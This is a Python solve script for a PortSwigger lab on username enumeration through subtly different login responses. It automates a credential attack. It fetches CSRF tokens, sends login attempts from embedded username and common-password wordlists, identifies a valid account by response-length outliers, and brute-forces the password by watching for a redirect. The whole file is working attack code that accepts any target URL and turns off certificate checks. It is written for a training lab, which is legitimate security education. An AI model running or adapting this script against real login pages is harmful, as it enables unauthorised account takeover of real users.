#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Username enumeration via subtly different responses.

Identifies valid username by response length outlier, then brute-forces password.
"""

import argparse
import re
import requests
import urllib3
from collections import Counter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAMES = [
    "carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
    "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
    "accware","action","addresses","adkit","admin2","admins","agentsmith","aid","aidan"
]

PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
    "dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman",
    "1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan",
    "jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew"
]


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def enumerate_username(session: requests.Session, lab: str, usernames: list[str]) -> str:
    lengths: dict[str, int] = {}
    for username in usernames:
        csrf = get_csrf(session, f"{lab}/login")
        r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": "dummy"})
        lengths[username] = len(r.text)

    freq = Counter(lengths.values())
    common_length = freq.most_common(1)[0][0]
    outliers = [u for u, l in lengths.items() if l != common_length]

    if not outliers:
        raise SystemExit("[-] No outlier found — try a larger wordlist")
    username = outliers[0]
    print(f"[+] Valid username (length outlier): {username} (len={lengths[username]}, common={common_length})")
    return username


def brute_password(session: requests.Session, lab: str, username: str, passwords: list[str]) -> str:
    for password in passwords:
        csrf = get_csrf(session, f"{lab}/login")
        r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password},
                         allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Password found: {password}")
            return password
    raise SystemExit("[-] Password not found")


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 4 (subtle response enumeration)")
    parser.add_argument("lab_url")
    parser.add_argument("--userlist")
    parser.add_argument("--passlist")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    usernames = open(args.userlist).read().splitlines() if args.userlist else USERNAMES
    passwords = open(args.passlist).read().splitlines() if args.passlist else PASSWORDS

    username = enumerate_username(s, lab, usernames)
    password = brute_password(s, lab, username, passwords)
    print(f"[+] Credentials: {username}:{password}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
